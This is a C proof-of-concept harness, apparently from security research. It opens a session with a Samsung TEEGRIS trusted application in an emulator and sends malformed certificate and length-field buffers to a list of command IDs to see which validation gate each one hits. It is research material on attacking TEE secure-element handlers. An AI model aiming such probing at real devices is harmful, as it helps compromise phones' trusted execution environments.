/* SEMeSE command sweep — characterize the gate each parseItemsFromGpCert
 * path and each off-by-8 command hits in the emulator.
 *  - 314/315: eSEK/SCP11 cert-chain  -> unwrapSecureObject_with_uuid gate
 *  - 47/303/304: card-info / credentials -> eSE APDU peer (secApdu_*)
 *  - 42/43/44: off-by-8 card challenge/cryptogram/metadata -> eSE APDU peer
 * Each handler emits a unique [I]SEM/[E]SEM log line we can grep afterward.
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

#define BUFSZ 92172

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-53454d655345";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }

    uint8_t cert[7] = {0x7F,0x21,0x04,0x93,0x82,0xFF,0xFF};
    uint32_t cmds[] = {314, 315, 47, 303, 304, 42, 43, 44};
    int ncmds = sizeof(cmds)/sizeof(cmds[0]);

    for (int i = 0; i < ncmds; i++) {
        memset(in, 0, BUFSZ);
        memset(out, 0, BUFSZ);
        /* generic eSEK-style framing: keyset_len=8 @+8, cert_len=7 @+20,
         * cert @+24, payload_len @+92168. Harmless for non-eSEK cmds. */
        *(uint32_t*)(in + 8)     = 8;
        *(uint32_t*)(in + 20)    = 7;
        memcpy(in + 24, cert, 7);
        *(uint32_t*)(in + 92168) = 0x100;

        memset(&op, 0, sizeof(op));
        op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                         TEEC_NONE, TEEC_NONE);
        op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = BUFSZ;
        op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = BUFSZ;

        printf("[poc] >>> invoking cmd %u\n", cmds[i]);
        res = TEEC_InvokeCommand_impl(&session, cmds[i], &op, &err_origin);
        printf("[poc] <<< cmd %u returned 0x%x (%d)\n", cmds[i], res, (int)res);
    }

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
